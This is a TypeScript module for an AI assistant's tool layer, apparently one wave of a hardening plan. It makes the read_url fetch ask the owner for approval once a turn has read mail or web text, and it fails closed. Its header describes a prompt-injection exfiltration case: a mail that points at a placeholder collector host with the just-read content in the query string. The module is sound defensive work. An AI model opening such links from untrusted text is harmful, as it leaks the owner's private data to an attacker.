/**
 * W7D-s3 — a link met after somebody else's words is a decision, not a read.
 *
 * WHAT THIS DEFENDS AGAINST. The chief of staff has no file, shell or web-search tool: every one
 * of `agent/tools/{bash,read_file,write_file,web_fetch,web_search,agent,task_cancel}.ts` is a
 * `disableTool()` sentinel. The one path left that turns untrusted TEXT into an outbound REQUEST
 * on the owner's behalf is `read_url`, whose readability worker will fetch any host. So the
 * cheapest exfiltration in this box is an address inside someone else's message: a mail that says
 * "for details see https://collector.example/?d=<what you just read>", opened in the same turn it
 * was read in. Nothing about that call looks unusual — it is a read tool doing a read.
 *
 * SO THE FETCH ASKS, BUT ONLY WHERE IT IS A DECISION. The question this policy answers is not
 * "is this link safe" (unanswerable) but "has this turn already read words the owner did not
 * write". A turn where it has not — the owner pasting a link and asking what is on the page — is
 * exactly as it was before this module existed: one call, no card (owner decision D1). A turn
 * where it has gets one card per call, naming the whole address
 * (`approval-summary.ts`'s `read_url` formatter).
 *
 * WHY THE POLICY AND NOT THE TOOL. The taint is per TURN, and a turn parked on an approval card
 * does not stay open: the harness emits its epilogue at the park point and the continuation
 * arrives as a brand-new turn id (`origin-taint.ts`'s `TAINT_MAX_AGE_MS` docblock). The taint is
 * therefore NOT readable inside an approved tool's `execute` — by the time the owner has tapped,
 * the turn that read the mail is over. An approval policy runs in the ORIGINAL turn, before the
 * park, which is the only place this question can still be asked.
 *
 * THE TAINT IS READ, NEVER RE-DERIVED. "Tainted" means exactly what waves 3–4 recorded: an entry
 * in `origin-taint.ts`'s per-turn map, written by `agent/hooks/origin-taint.ts` on a tool result
 * from `gmail_read` / `gmail_search` / `read_url`, and by the handful of tools that classify
 * themselves more precisely at their own call site. There is no second heuristic here — a new
 * reading tool becomes covered by being added to that register, in one place, not two.
 *
 * FAILS CLOSED. A context this cannot turn into a turn key (no session, no turn id, a half key)
 * asks. That is the same direction `stampFor` already takes for a write it cannot attribute: an
 * unattributable fetch is precisely the state an attacker would engineer, so it never gets the
 * benefit of the doubt. The cost of being wrong in this direction is one tap.
 *
 * A FUNCTION, NOT eve's `{request, response}` OBJECT. Each role's `agent/tools/catalogue.ts`
 * re-stamps a durable approval descriptor by CALLING `tool.approval`
 * (`(valueOf(name).approval as (...a) => unknown)(...args)`), so an object here would be called
 * as a function and eve would drop the whole resolver result — the incident where a role went
 * from 77 tools to 4 with every build green. Recorded in the wave-7 plan as finding 7.
 *
 * MODULE SCOPE IS INERT: `eve build` evaluates every module with no secrets and no database.
 */
import type { ApprovalStatus } from "eve/tools/approval";

import { currentTaint, turnKeyFrom } from "./origin-taint.js";

/**
 * Why a link can suddenly ask, in one sentence a human reads.
 *
 * It is NOT carried on the returned status: eve's `ApprovalStatus` declares `reason?: never` on
 * the `user-approval` variant (`eve/dist/src/approval/definition.d.ts`) — only a DENIAL may carry
 * a reason. So this sentence lives here, exported, for the surfaces that can show it: the tool's
 * own description, which the model reads every session, and any future board or console row.
 */
export const TAINTED_FETCH_REASON =
  "this turn has already read words the owner did not write, so opening a link out of it is a " +
  "decision he makes, not a read";

/**
 * The approval policy for a fetch: ask once this turn has read somebody else's words.
 *
 * Returns eve's `"not-applicable"` (run, no card) or `"user-approval"` (park on a card). The
 * argument is typed `unknown` on purpose — it is eve's `ApprovalContext`, but `turnKeyFrom` is
 * total over anything, and a policy that threw would take the approval gate down with it.
 */
export function asksAfterUntrustedText(): (ctx?: unknown) => Promise<ApprovalStatus> {
  return async (ctx?: unknown): Promise<ApprovalStatus> => {
    const key = turnKeyFrom(ctx);
    if (!key) return "user-approval";
    return currentTaint(key) === undefined ? "not-applicable" : "user-approval";
  };
}
